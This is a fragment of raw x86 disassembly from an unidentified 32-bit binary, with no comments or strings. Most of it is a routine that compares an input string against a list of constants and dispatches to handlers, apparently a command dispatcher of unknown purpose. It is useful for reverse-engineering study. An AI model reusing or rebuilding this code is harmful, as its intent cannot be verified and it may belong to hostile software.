  40a654:	74 72                	je     0x40a6c8
  40a656:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40a659:	50                   	push   %eax
  40a65a:	ff 15 78 01 41 00    	call   *0x410178
  40a660:	0f b7 45 e2          	movzwl -0x1e(%ebp),%eax
  40a664:	50                   	push   %eax
  40a665:	8d 8d ec fc ff ff    	lea    -0x314(%ebp),%ecx
  40a66b:	0f b7 45 e0          	movzwl -0x20(%ebp),%eax
  40a66f:	50                   	push   %eax
  40a670:	0f b7 45 de          	movzwl -0x22(%ebp),%eax
  40a674:	50                   	push   %eax
  40a675:	0f b7 45 dc          	movzwl -0x24(%ebp),%eax
  40a679:	50                   	push   %eax
  40a67a:	8d 45 f6             	lea    -0xa(%ebp),%eax
  40a67d:	68 c4 12 41 00       	push   $0x4112c4
  40a682:	50                   	push   %eax
  40a683:	68 20 13 41 00       	push   $0x411320
  40a688:	ff 15 4c 02 41 00    	call   *0x41024c
  40a68e:	50                   	push   %eax
  40a68f:	8d 85 0c fd ff ff    	lea    -0x2f4(%ebp),%eax
  40a695:	50                   	push   %eax
  40a696:	e8 85 55 00 00       	call   0x40fc20
  40a69b:	83 c4 0c             	add    $0xc,%esp
  40a69e:	8b c8                	mov    %eax,%ecx
  40a6a0:	ff 15 58 02 41 00    	call   *0x410258
  40a6a6:	50                   	push   %eax
  40a6a7:	ff 15 74 03 41 00    	call   *0x410374
  40a6ad:	83 c4 14             	add    $0x14,%esp
  40a6b0:	8d 8d 0c fd ff ff    	lea    -0x2f4(%ebp),%ecx
  40a6b6:	ff 15 54 02 41 00    	call   *0x410254
  40a6bc:	8d 8d ec fc ff ff    	lea    -0x314(%ebp),%ecx
  40a6c2:	ff 15 54 02 41 00    	call   *0x410254
  40a6c8:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  40a6cb:	ff 15 54 02 41 00    	call   *0x410254
  40a6d1:	ff 45 f8             	incl   -0x8(%ebp)
  40a6d4:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40a6da:	e8 d6 6b ff ff       	call   0x4012b5
  40a6df:	39 45 f8             	cmp    %eax,-0x8(%ebp)
  40a6e2:	72 2d                	jb     0x40a711
  40a6e4:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40a6e8:	6a 02                	push   $0x2
  40a6ea:	b9 40 59 41 00       	mov    $0x415940,%ecx
  40a6ef:	e8 95 6b ff ff       	call   0x401289
  40a6f4:	8b c8                	mov    %eax,%ecx
  40a6f6:	ff 15 58 02 41 00    	call   *0x410258
  40a6fc:	50                   	push   %eax
  40a6fd:	ff 15 9c 03 41 00    	call   *0x41039c
  40a703:	69 c0 e8 03 00 00    	imul   $0x3e8,%eax,%eax
  40a709:	59                   	pop    %ecx
  40a70a:	50                   	push   %eax
  40a70b:	ff 15 8c 01 41 00    	call   *0x41018c
  40a711:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40a714:	e8 23 74 ff ff       	call   0x401b3c
  40a719:	e9 40 f8 ff ff       	jmp    0x409f5e
  40a71e:	55                   	push   %ebp
  40a71f:	8b ec                	mov    %esp,%ebp
  40a721:	81 ec d8 06 00 00    	sub    $0x6d8,%esp
  40a727:	53                   	push   %ebx
  40a728:	56                   	push   %esi
  40a729:	8b 75 08             	mov    0x8(%ebp),%esi
  40a72c:	57                   	push   %edi
  40a72d:	8d 8d 14 ff ff ff    	lea    -0xec(%ebp),%ecx
  40a733:	8d 7e 18             	lea    0x18(%esi),%edi
  40a736:	57                   	push   %edi
  40a737:	ff 15 60 02 41 00    	call   *0x410260
  40a73d:	ff 76 28             	push   0x28(%esi)
  40a740:	ff 15 64 01 41 00    	call   *0x410164
  40a746:	ff 76 28             	push   0x28(%esi)
  40a749:	ff 15 58 01 41 00    	call   *0x410158
  40a74f:	83 ec 10             	sub    $0x10,%esp
  40a752:	be 68 52 41 00       	mov    $0x415268,%esi
  40a757:	8b cc                	mov    %esp,%ecx
  40a759:	56                   	push   %esi
  40a75a:	ff 15 60 02 41 00    	call   *0x410260
  40a760:	83 ec 10             	sub    $0x10,%esp
  40a763:	8b cc                	mov    %esp,%ecx
  40a765:	57                   	push   %edi
  40a766:	ff 15 60 02 41 00    	call   *0x410260
  40a76c:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40a76f:	50                   	push   %eax
  40a770:	e8 40 48 00 00       	call   0x40efb5
  40a775:	83 c4 24             	add    $0x24,%esp
  40a778:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a77b:	e8 35 6b ff ff       	call   0x4012b5
  40a780:	85 c0                	test   %eax,%eax
  40a782:	0f 86 f6 14 00 00    	jbe    0x40bc7e
  40a788:	6a 00                	push   $0x0
  40a78a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a78d:	e8 f7 6a ff ff       	call   0x401289
  40a792:	50                   	push   %eax
  40a793:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40a796:	ff 15 60 02 41 00    	call   *0x410260
  40a79c:	8b 1d 38 02 41 00    	mov    0x410238,%ebx
  40a7a2:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40a7a5:	68 3c 16 41 00       	push   $0x41163c
  40a7aa:	50                   	push   %eax
  40a7ab:	ff d3                	call   *%ebx
  40a7ad:	8b 3d 9c 03 41 00    	mov    0x41039c,%edi
  40a7b3:	59                   	pop    %ecx
  40a7b4:	84 c0                	test   %al,%al
  40a7b6:	59                   	pop    %ecx
  40a7b7:	0f 84 c2 01 00 00    	je     0x40a97f
  40a7bd:	ff 15 b0 00 41 00    	call   *0x4100b0
  40a7c3:	50                   	push   %eax
  40a7c4:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40a7c7:	50                   	push   %eax
  40a7c8:	e8 68 45 00 00       	call   0x40ed35
  40a7cd:	51                   	push   %ecx
  40a7ce:	51                   	push   %ecx
  40a7cf:	8b fc                	mov    %esp,%edi
  40a7d1:	50                   	push   %eax
  40a7d2:	56                   	push   %esi
  40a7d3:	e8 c0 40 00 00       	call   0x40e898
  40a7d8:	50                   	push   %eax
  40a7d9:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40a7dc:	50                   	push   %eax
  40a7dd:	e8 53 45 00 00       	call   0x40ed35
  40a7e2:	59                   	pop    %ecx
  40a7e3:	59                   	pop    %ecx
  40a7e4:	50                   	push   %eax
  40a7e5:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40a7eb:	56                   	push   %esi
  40a7ec:	50                   	push   %eax
  40a7ed:	e8 6b 40 00 00       	call   0x40e85d
  40a7f2:	50                   	push   %eax
  40a7f3:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  40a7f9:	50                   	push   %eax
  40a7fa:	e8 d4 45 00 00       	call   0x40edd3
  40a7ff:	83 c4 0c             	add    $0xc,%esp
  40a802:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a805:	50                   	push   %eax
  40a806:	56                   	push   %esi
  40a807:	6a 01                	push   $0x1
  40a809:	e8 7b 6a ff ff       	call   0x401289
  40a80e:	50                   	push   %eax
  40a80f:	56                   	push   %esi
  40a810:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  40a816:	68 34 16 41 00       	push   $0x411634
  40a81b:	50                   	push   %eax
  40a81c:	e8 f9 53 00 00       	call   0x40fc1a
  40a821:	83 c4 0c             	add    $0xc,%esp
  40a824:	50                   	push   %eax
  40a825:	8d 85 34 ff ff ff    	lea    -0xcc(%ebp),%eax
  40a82b:	50                   	push   %eax
  40a82c:	e8 e3 53 00 00       	call   0x40fc14
  40a831:	83 c4 0c             	add    $0xc,%esp
  40a834:	50                   	push   %eax
  40a835:	8d 85 44 ff ff ff    	lea    -0xbc(%ebp),%eax
  40a83b:	50                   	push   %eax
  40a83c:	e8 d3 53 00 00       	call   0x40fc14
  40a841:	83 c4 0c             	add    $0xc,%esp
  40a844:	50                   	push   %eax
  40a845:	8d 85 5c ff ff ff    	lea    -0xa4(%ebp),%eax
  40a84b:	50                   	push   %eax
  40a84c:	e8 c3 53 00 00       	call   0x40fc14
  40a851:	83 c4 0c             	add    $0xc,%esp
  40a854:	50                   	push   %eax
  40a855:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
  40a85b:	50                   	push   %eax
  40a85c:	e8 b3 53 00 00       	call   0x40fc14
  40a861:	83 c4 0c             	add    $0xc,%esp
  40a864:	50                   	push   %eax
  40a865:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40a868:	50                   	push   %eax
  40a869:	e8 a6 53 00 00       	call   0x40fc14
  40a86e:	83 c4 0c             	add    $0xc,%esp
  40a871:	50                   	push   %eax
  40a872:	8d 45 8c             	lea    -0x74(%ebp),%eax
  40a875:	50                   	push   %eax
  40a876:	e8 99 53 00 00       	call   0x40fc14
  40a87b:	83 c4 0c             	add    $0xc,%esp
  40a87e:	50                   	push   %eax
  40a87f:	57                   	push   %edi
  40a880:	e8 8f 53 00 00       	call   0x40fc14
  40a885:	be 30 5a 41 00       	mov    $0x415a30,%esi
  40a88a:	83 c4 0c             	add    $0xc,%esp
  40a88d:	8b ce                	mov    %esi,%ecx
  40a88f:	e8 04 79 ff ff       	call   0x402198
  40a894:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40a897:	ff 15 54 02 41 00    	call   *0x410254
  40a89d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40a8a0:	ff 15 54 02 41 00    	call   *0x410254
  40a8a6:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
  40a8ac:	ff 15 54 02 41 00    	call   *0x410254
  40a8b2:	8d 8d 5c ff ff ff    	lea    -0xa4(%ebp),%ecx
  40a8b8:	ff 15 54 02 41 00    	call   *0x410254
  40a8be:	8d 8d 44 ff ff ff    	lea    -0xbc(%ebp),%ecx
  40a8c4:	ff 15 54 02 41 00    	call   *0x410254
  40a8ca:	8d 8d 34 ff ff ff    	lea    -0xcc(%ebp),%ecx
  40a8d0:	ff 15 54 02 41 00    	call   *0x410254
  40a8d6:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  40a8dc:	ff 15 54 02 41 00    	call   *0x410254
  40a8e2:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  40a8e8:	ff 15 54 02 41 00    	call   *0x410254
  40a8ee:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40a8f4:	ff 15 c0 02 41 00    	call   *0x4102c0
  40a8fa:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40a8fd:	ff 15 54 02 41 00    	call   *0x410254
  40a903:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40a906:	ff 15 54 02 41 00    	call   *0x410254
  40a90c:	6a 02                	push   $0x2
  40a90e:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a911:	e8 73 69 ff ff       	call   0x401289
  40a916:	8b c8                	mov    %eax,%ecx
  40a918:	ff 15 58 02 41 00    	call   *0x410258
  40a91e:	8b 3d 9c 03 41 00    	mov    0x41039c,%edi
  40a924:	50                   	push   %eax
  40a925:	ff d7                	call   *%edi
  40a927:	85 c0                	test   %eax,%eax
  40a929:	59                   	pop    %ecx
  40a92a:	76 29                	jbe    0x40a955
  40a92c:	03 c0                	add    %eax,%eax
  40a92e:	8b ce                	mov    %esi,%ecx
  40a930:	89 45 08             	mov    %eax,0x8(%ebp)
  40a933:	e8 ae 79 ff ff       	call   0x4022e6
  40a938:	ff 75 08             	push   0x8(%ebp)
  40a93b:	8b ce                	mov    %esi,%ecx
  40a93d:	84 c0                	test   %al,%al
  40a93f:	74 0a                	je     0x40a94b
  40a941:	e8 ac 7d ff ff       	call   0x4026f2
  40a946:	e9 b9 0c 00 00       	jmp    0x40b604
  40a94b:	e8 f6 7c ff ff       	call   0x402646
  40a950:	e9 af 0c 00 00       	jmp    0x40b604
  40a955:	68 44 08 41 00       	push   $0x410844
  40a95a:	6a 01                	push   $0x1
  40a95c:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a95f:	e8 25 69 ff ff       	call   0x401289
  40a964:	50                   	push   %eax
  40a965:	ff d3                	call   *%ebx
  40a967:	59                   	pop    %ecx
  40a968:	84 c0                	test   %al,%al
  40a96a:	59                   	pop    %ecx
  40a96b:	0f 84 93 0c 00 00    	je     0x40b604
  40a971:	6a 00                	push   $0x0
  40a973:	8b ce                	mov    %esi,%ecx
  40a975:	e8 17 7e ff ff       	call   0x402791
  40a97a:	e9 85 0c 00 00       	jmp    0x40b604
  40a97f:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40a982:	68 24 16 41 00       	push   $0x411624
  40a987:	50                   	push   %eax
  40a988:	ff d3                	call   *%ebx
  40a98a:	59                   	pop    %ecx
  40a98b:	84 c0                	test   %al,%al
  40a98d:	59                   	pop    %ecx
  40a98e:	74 09                	je     0x40a999
  40a990:	6a 00                	push   $0x0
  40a992:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  40a997:	eb dc                	jmp    0x40a975
  40a999:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40a99c:	68 1c 16 41 00       	push   $0x41161c
  40a9a1:	50                   	push   %eax
  40a9a2:	ff d3                	call   *%ebx
  40a9a4:	59                   	pop    %ecx
  40a9a5:	84 c0                	test   %al,%al
  40a9a7:	59                   	pop    %ecx
  40a9a8:	74 23                	je     0x40a9cd
  40a9aa:	6a 01                	push   $0x1
  40a9ac:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a9af:	e8 d5 68 ff ff       	call   0x401289
  40a9b4:	83 ec 10             	sub    $0x10,%esp
  40a9b7:	8b cc                	mov    %esp,%ecx
  40a9b9:	50                   	push   %eax
  40a9ba:	ff 15 60 02 41 00    	call   *0x410260
  40a9c0:	e8 dd 14 00 00       	call   0x40bea2
  40a9c5:	83 c4 10             	add    $0x10,%esp
  40a9c8:	e9 37 0c 00 00       	jmp    0x40b604
  40a9cd:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40a9d0:	68 04 16 41 00       	push   $0x411604
  40a9d5:	50                   	push   %eax
  40a9d6:	ff d3                	call   *%ebx
  40a9d8:	59                   	pop    %ecx
  40a9d9:	84 c0                	test   %al,%al
  40a9db:	59                   	pop    %ecx
  40a9dc:	74 70                	je     0x40aa4e
  40a9de:	6a 02                	push   $0x2
  40a9e0:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a9e3:	e8 a1 68 ff ff       	call   0x401289
  40a9e8:	8b c8                	mov    %eax,%ecx
  40a9ea:	ff 15 58 02 41 00    	call   *0x410258
  40a9f0:	50                   	push   %eax
  40a9f1:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40a9f4:	6a 30                	push   $0x30
  40a9f6:	50                   	push   %eax
  40a9f7:	e8 33 c7 ff ff       	call   0x40712f
  40a9fc:	83 c4 0c             	add    $0xc,%esp
  40a9ff:	33 f6                	xor    %esi,%esi
  40aa01:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40aa04:	56                   	push   %esi
  40aa05:	56                   	push   %esi
  40aa06:	ff 15 58 02 41 00    	call   *0x410258
  40aa0c:	50                   	push   %eax
  40aa0d:	6a 01                	push   $0x1
  40aa0f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40aa12:	e8 72 68 ff ff       	call   0x401289
  40aa17:	8b c8                	mov    %eax,%ecx
  40aa19:	ff 15 58 02 41 00    	call   *0x410258
  40aa1f:	50                   	push   %eax
  40aa20:	56                   	push   %esi
  40aa21:	e8 30 55 00 00       	call   0x40ff56
  40aa26:	6a 01                	push   $0x1
  40aa28:	56                   	push   %esi
  40aa29:	56                   	push   %esi
  40aa2a:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40aa2d:	ff 15 58 02 41 00    	call   *0x410258
  40aa33:	50                   	push   %eax
  40aa34:	68 18 07 41 00       	push   $0x410718
  40aa39:	56                   	push   %esi
  40aa3a:	ff 15 bc 03 41 00    	call   *0x4103bc
  40aa40:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40aa43:	ff 15 54 02 41 00    	call   *0x410254
  40aa49:	e9 b6 0b 00 00       	jmp    0x40b604
  40aa4e:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40aa51:	68 ec 15 41 00       	push   $0x4115ec
  40aa56:	50                   	push   %eax
  40aa57:	ff d3                	call   *%ebx
  40aa59:	59                   	pop    %ecx
  40aa5a:	84 c0                	test   %al,%al
  40aa5c:	59                   	pop    %ecx
  40aa5d:	0f 84 b9 00 00 00    	je     0x40ab1c
  40aa63:	6a 01                	push   $0x1
  40aa65:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40aa68:	e8 1c 68 ff ff       	call   0x401289
  40aa6d:	8b c8                	mov    %eax,%ecx
  40aa6f:	ff 15 58 02 41 00    	call   *0x410258
  40aa75:	50                   	push   %eax
  40aa76:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40aa79:	6a 30                	push   $0x30
  40aa7b:	50                   	push   %eax
  40aa7c:	e8 ae c6 ff ff       	call   0x40712f
  40aa81:	83 c4 0c             	add    $0xc,%esp
  40aa84:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40aa87:	6a 01                	push   $0x1
  40aa89:	6a 32                	push   $0x32
  40aa8b:	ff 15 58 02 41 00    	call   *0x410258
  40aa91:	50                   	push   %eax
  40aa92:	8d 8d 78 fe ff ff    	lea    -0x188(%ebp),%ecx
  40aa98:	ff 15 2c 02 41 00    	call   *0x41022c
  40aa9e:	8d 8d 78 fe ff ff    	lea    -0x188(%ebp),%ecx
  40aaa4:	ff 15 30 02 41 00    	call   *0x410230
  40aaaa:	84 c0                	test   %al,%al
  40aaac:	74 5a                	je     0x40ab08
  40aaae:	6a 02                	push   $0x2
  40aab0:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40aab3:	e8 d1 67 ff ff       	call   0x401289
  40aab8:	8b c8                	mov    %eax,%ecx
  40aaba:	ff 15 90 02 41 00    	call   *0x410290
  40aac0:	50                   	push   %eax
  40aac1:	6a 02                	push   $0x2
  40aac3:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40aac6:	e8 be 67 ff ff       	call   0x401289
  40aacb:	8b c8                	mov    %eax,%ecx
  40aacd:	ff 15 58 02 41 00    	call   *0x410258
  40aad3:	50                   	push   %eax
  40aad4:	8d 8d 78 fe ff ff    	lea    -0x188(%ebp),%ecx
  40aada:	ff 15 7c 02 41 00    	call   *0x41027c
  40aae0:	8d 8d 78 fe ff ff    	lea    -0x188(%ebp),%ecx
  40aae6:	ff 15 fc 02 41 00    	call   *0x4102fc
  40aaec:	33 f6                	xor    %esi,%esi
  40aaee:	6a 01                	push   $0x1
  40aaf0:	56                   	push   %esi
  40aaf1:	56                   	push   %esi
  40aaf2:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40aaf5:	ff 15 58 02 41 00    	call   *0x410258
  40aafb:	50                   	push   %eax
  40aafc:	68 18 07 41 00       	push   $0x410718
  40ab01:	56                   	push   %esi
  40ab02:	ff 15 bc 03 41 00    	call   *0x4103bc
  40ab08:	8d 8d 78 fe ff ff    	lea    -0x188(%ebp),%ecx
  40ab0e:	ff 15 f8 02 41 00    	call   *0x4102f8
  40ab14:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40ab17:	e9 27 ff ff ff       	jmp    0x40aa43
  40ab1c:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40ab1f:	68 e0 15 41 00       	push   $0x4115e0
  40ab24:	50                   	push   %eax
  40ab25:	ff d3                	call   *%ebx
  40ab27:	59                   	pop    %ecx
  40ab28:	84 c0                	test   %al,%al
  40ab2a:	59                   	pop    %ecx
  40ab2b:	0f 84 a1 00 00 00    	je     0x40abd2
  40ab31:	8d 45 08             	lea    0x8(%ebp),%eax
  40ab34:	6a 0a                	push   $0xa
  40ab36:	50                   	push   %eax
  40ab37:	ff 15 c4 00 41 00    	call   *0x4100c4
  40ab3d:	50                   	push   %eax
  40ab3e:	ff 15 5c 03 41 00    	call   *0x41035c
  40ab44:	51                   	push   %ecx
  40ab45:	8d 45 08             	lea    0x8(%ebp),%eax
  40ab48:	8b fc                	mov    %esp,%edi
  40ab4a:	50                   	push   %eax
  40ab4b:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  40ab51:	56                   	push   %esi
  40ab52:	50                   	push   %eax
  40ab53:	e8 5f d6 ff ff       	call   0x4081b7
  40ab58:	59                   	pop    %ecx
  40ab59:	50                   	push   %eax
  40ab5a:	56                   	push   %esi
  40ab5b:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40ab61:	68 d4 15 41 00       	push   $0x4115d4
  40ab66:	50                   	push   %eax
  40ab67:	e8 ae 50 00 00       	call   0x40fc1a
  40ab6c:	83 c4 0c             	add    $0xc,%esp
  40ab6f:	50                   	push   %eax
  40ab70:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40ab73:	50                   	push   %eax
  40ab74:	e8 9b 50 00 00       	call   0x40fc14
  40ab79:	83 c4 0c             	add    $0xc,%esp
  40ab7c:	50                   	push   %eax
  40ab7d:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40ab80:	50                   	push   %eax
  40ab81:	e8 8e 50 00 00       	call   0x40fc14
  40ab86:	83 c4 0c             	add    $0xc,%esp
  40ab89:	50                   	push   %eax
  40ab8a:	57                   	push   %edi
  40ab8b:	e8 90 50 00 00       	call   0x40fc20
  40ab90:	83 c4 0c             	add    $0xc,%esp
  40ab93:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  40ab98:	e8 fb 75 ff ff       	call   0x402198
  40ab9d:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40aba0:	ff 15 54 02 41 00    	call   *0x410254
  40aba6:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40aba9:	ff 15 54 02 41 00    	call   *0x410254
  40abaf:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40abb5:	ff 15 54 02 41 00    	call   *0x410254
  40abbb:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  40abc1:	ff 15 54 02 41 00    	call   *0x410254
  40abc7:	8b 3d 9c 03 41 00    	mov    0x41039c,%edi
  40abcd:	e9 32 0a 00 00       	jmp    0x40b604
  40abd2:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40abd5:	68 c8 15 41 00       	push   $0x4115c8
  40abda:	50                   	push   %eax
  40abdb:	ff d3                	call   *%ebx
  40abdd:	59                   	pop    %ecx
  40abde:	84 c0                	test   %al,%al
  40abe0:	59                   	pop    %ecx
  40abe1:	74 22                	je     0x40ac05
  40abe3:	6a 01                	push   $0x1
  40abe5:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40abe8:	e8 9c 66 ff ff       	call   0x401289
  40abed:	8b c8                	mov    %eax,%ecx
  40abef:	ff 15 58 02 41 00    	call   *0x410258
  40abf5:	50                   	push   %eax
  40abf6:	ff d7                	call   *%edi
  40abf8:	50                   	push   %eax
  40abf9:	e8 df 40 00 00       	call   0x40ecdd
  40abfe:	59                   	pop    %ecx
  40abff:	59                   	pop    %ecx
  40ac00:	e9 ff 09 00 00       	jmp    0x40b604
  40ac05:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40ac08:	68 bc 15 41 00       	push   $0x4115bc
  40ac0d:	50                   	push   %eax
  40ac0e:	ff d3                	call   *%ebx
  40ac10:	59                   	pop    %ecx
  40ac11:	84 c0                	test   %al,%al
  40ac13:	59                   	pop    %ecx
  40ac14:	74 0a                	je     0x40ac20
  40ac16:	e8 c2 1d 00 00       	call   0x40c9dd
  40ac1b:	e9 e4 09 00 00       	jmp    0x40b604
  40ac20:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40ac23:	68 b0 15 41 00       	push   $0x4115b0
  40ac28:	50                   	push   %eax
  40ac29:	ff d3                	call   *%ebx
  40ac2b:	59                   	pop    %ecx
  40ac2c:	84 c0                	test   %al,%al
  40ac2e:	59                   	pop    %ecx
  40ac2f:	74 22                	je     0x40ac53
  40ac31:	6a 01                	push   $0x1
  40ac33:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40ac36:	e8 4e 66 ff ff       	call   0x401289
  40ac3b:	8b c8                	mov    %eax,%ecx
  40ac3d:	ff 15 58 02 41 00    	call   *0x410258
  40ac43:	50                   	push   %eax
  40ac44:	ff d7                	call   *%edi
  40ac46:	59                   	pop    %ecx
  40ac47:	50                   	push   %eax
  40ac48:	ff 15 10 04 41 00    	call   *0x410410
  40ac4e:	e9 b1 09 00 00       	jmp    0x40b604
  40ac53:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40ac56:	68 a4 15 41 00       	push   $0x4115a4
  40ac5b:	50                   	push   %eax
  40ac5c:	ff d3                	call   *%ebx
  40ac5e:	59                   	pop    %ecx
  40ac5f:	84 c0                	test   %al,%al
  40ac61:	59                   	pop    %ecx
  40ac62:	74 24                	je     0x40ac88
  40ac64:	6a 03                	push   $0x3
  40ac66:	6a 01                	push   $0x1
  40ac68:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40ac6b:	e8 19 66 ff ff       	call   0x401289
  40ac70:	8b c8                	mov    %eax,%ecx
  40ac72:	ff 15 58 02 41 00    	call   *0x410258
  40ac78:	50                   	push   %eax
  40ac79:	ff d7                	call   *%edi
  40ac7b:	59                   	pop    %ecx
  40ac7c:	50                   	push   %eax
  40ac7d:	ff 15 0c 04 41 00    	call   *0x41040c
  40ac83:	e9 7c 09 00 00       	jmp    0x40b604
  40ac88:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40ac8b:	68 94 15 41 00       	push   $0x411594
  40ac90:	50                   	push   %eax
  40ac91:	ff d3                	call   *%ebx
  40ac93:	59                   	pop    %ecx
  40ac94:	84 c0                	test   %al,%al
  40ac96:	59                   	pop    %ecx
  40ac97:	74 04                	je     0x40ac9d
  40ac99:	6a 09                	push   $0x9
  40ac9b:	eb c9                	jmp    0x40ac66
  40ac9d:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40aca0:	68 80 15 41 00       	push   $0x411580
  40aca5:	50                   	push   %eax
  40aca6:	ff d3                	call   *%ebx
  40aca8:	59                   	pop    %ecx
  40aca9:	84 c0                	test   %al,%al
  40acab:	59                   	pop    %ecx
  40acac:	74 2f                	je     0x40acdd
  40acae:	8d 45 08             	lea    0x8(%ebp),%eax
  40acb1:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40acb4:	50                   	push   %eax
  40acb5:	6a 01                	push   $0x1
  40acb7:	e8 cd 65 ff ff       	call   0x401289
  40acbc:	8b c8                	mov    %eax,%ecx
  40acbe:	ff 15 58 02 41 00    	call   *0x410258
  40acc4:	50                   	push   %eax
  40acc5:	ff d7                	call   *%edi
  40acc7:	59                   	pop    %ecx
  40acc8:	50                   	push   %eax
  40acc9:	ff 15 08 04 41 00    	call   *0x410408
  40accf:	ff 75 08             	push   0x8(%ebp)
  40acd2:	e8 06 40 00 00       	call   0x40ecdd
  40acd7:	59                   	pop    %ecx
  40acd8:	e9 39 ff ff ff       	jmp    0x40ac16
  40acdd:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40ace0:	68 78 15 41 00       	push   $0x411578
  40ace5:	50                   	push   %eax
  40ace6:	ff d3                	call   *%ebx
  40ace8:	59                   	pop    %ecx
  40ace9:	84 c0                	test   %al,%al
  40aceb:	59                   	pop    %ecx
  40acec:	74 20                	je     0x40ad0e
  40acee:	6a 05                	push   $0x5
  40acf0:	6a 01                	push   $0x1
  40acf2:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40acf5:	e8 8f 65 ff ff       	call   0x401289
  40acfa:	8b c8                	mov    %eax,%ecx
  40acfc:	ff 15 58 02 41 00    	call   *0x410258
  40ad02:	50                   	push   %eax
  40ad03:	ff 15 c0 00 41 00    	call   *0x4100c0
  40ad09:	e9 f6 08 00 00       	jmp    0x40b604
  40ad0e:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40ad11:	68 6c 15 41 00       	push   $0x41156c
  40ad16:	50                   	push   %eax
  40ad17:	ff d3                	call   *%ebx
  40ad19:	59                   	pop    %ecx
  40ad1a:	84 c0                	test   %al,%al
  40ad1c:	59                   	pop    %ecx
  40ad1d:	74 63                	je     0x40ad82
  40ad1f:	6a 01                	push   $0x1
  40ad21:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40ad24:	e8 60 65 ff ff       	call   0x401289
  40ad29:	83 ec 10             	sub    $0x10,%esp
  40ad2c:	8b cc                	mov    %esp,%ecx
  40ad2e:	50                   	push   %eax
  40ad2f:	ff 15 60 02 41 00    	call   *0x410260
  40ad35:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40ad38:	50                   	push   %eax
  40ad39:	e8 7b 3b 00 00       	call   0x40e8b9
  40ad3e:	59                   	pop    %ecx
  40ad3f:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40ad42:	8b d4                	mov    %esp,%edx
  40ad44:	50                   	push   %eax
  40ad45:	56                   	push   %esi
  40ad46:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40ad49:	68 60 15 41 00       	push   $0x411560
  40ad4e:	50                   	push   %eax
  40ad4f:	89 55 08             	mov    %edx,0x8(%ebp)
  40ad52:	e8 c3 4e 00 00       	call   0x40fc1a
  40ad57:	83 c4 0c             	add    $0xc,%esp
  40ad5a:	50                   	push   %eax
  40ad5b:	8b 45 08             	mov    0x8(%ebp),%eax
  40ad5e:	50                   	push   %eax
  40ad5f:	e8 b0 4e 00 00       	call   0x40fc14
  40ad64:	83 c4 0c             	add    $0xc,%esp
  40ad67:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  40ad6c:	e8 27 74 ff ff       	call   0x402198
